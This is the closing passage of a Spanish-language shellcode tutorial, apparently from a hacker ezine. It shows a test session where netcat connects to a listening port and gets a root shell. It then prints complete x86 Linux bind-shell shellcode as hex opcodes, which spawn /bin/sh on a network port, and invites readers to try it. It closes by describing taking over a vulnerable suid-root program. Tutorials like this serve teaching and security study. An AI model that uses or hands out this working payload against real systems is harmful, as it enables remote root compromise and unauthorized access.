+consola comprobamos que el puerto esta a la escucha y nos conectamos a el
+para conseguir nuestra shell:
+
+[CONSOLA 2]
+
+blackngel@mac:~$ netstat -a | grep "ESCUCHAR"
+tcp        0      0 *:48059                 *:*                     ESCUCHAR   
+blackngel@mac:~$ nc localhost 48059
+id
+uid=0(root) gid=0(root) groups=0(root)
+exit      
+blackngel@mac:~$
+
+Ahora podemos obtener los codigos de operacion con objdump, y nos quedamos con
+lo siguiente:
+
+"\x31\xc0\x31\xdb\x31\xc9\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80"
+"\x89\xc6\x52\x68\xbb\x02\xbb\xbb\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0"
+"\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe"
+"\xc3\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41"
+"\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+"\x89\xe1\xb0\x0b\xcd\x80"
+
+Pruebalo tu mismo.
+
+Aqui no explicaremos como crear una shellcode de conexion inversa (en la que es
+el host atacado el que se conecta a la victima). Eso te lo dejaremos de deberes
+a ti.
+
+Si necesitas textos interesantes para seguir explorando, tal vez te interesen
+estos:
+
+  [1] Writing ia32 alphanumeric shellcodes, by rix
+      http://www.phrack.org/issues.html?issue=57&id=15#article
+
+  [2] The Art of Writing Shellcode, by smiler
+      http://gatheringofgray.com/docs/INS/shellcode/art-shellcode.txt
+
+  [3] Designing Shellcode Demystified, by murat
+      http://gatheringofgray.com/docs/INS/shellcode/sc-en-demistified.txt
+
+
+
+---[ 6 - Conclusion
+
+Buscar en Google un Shellcode adaptado a tus necesidades es algo eficiente
+desde luego. Sacarla directamente de las que el framework de Metasploit te
+puede proporcionar resulta igual de confortable. Pero... jamas habra nada
+comparable a programartela con tus propias manos.
+
+Imaginate en un torneo en el que te ponen delante de una box con Linux sin
+accesso a internet y sin ninguna posibilidad de llevar material de trabajo
+propio. Un programa suid root vulnerable y tus manos vacias. La unica forma
+de lograr hacerte con el sistema es hacerlo todo tu mismo, recuerda que
+Linux te proporciona todas las herramientas basicas.
+
+Entonces queda claro, el copy-paste es para necios...
+
+Un abrazo!
+blackngel
+
+
+*EOF*
